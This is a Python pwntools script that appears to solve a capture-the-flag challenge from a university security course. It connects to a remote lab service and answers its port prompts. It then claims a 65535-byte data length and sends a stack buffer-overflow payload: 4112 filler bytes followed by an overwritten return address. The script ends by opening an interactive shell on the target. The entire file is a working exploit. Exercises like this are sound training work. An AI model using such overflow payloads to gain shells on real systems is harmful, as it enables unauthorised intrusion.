import os
os.environ['PWNLIB_NOTERM'] = '1'
from pwn import remote, p64
import struct
from struct import pack

# Connect to the remote server
conn = remote('cs2107-ctfd-i.comp.nus.edu', 16302)

# Read output until the "Source Port > " prompt
conn.recvuntil(b'Source Port > ')

# Send values for source and destination ports
conn.sendline('12345')  # Source Port
conn.recvuntil(b'Destination Port > ')
conn.sendline('54321')  # Destination Port

# Send data length
conn.recvuntil(b'Data Length > ')
data_len = 65535
conn.sendline(str(data_len))

# Generate payload
payload = b'A' *4112 + b';\x12@\x00\x00\x00\x00\x00'

# Send payload
conn.sendline(payload)

# Launch shell
conn.interactive()
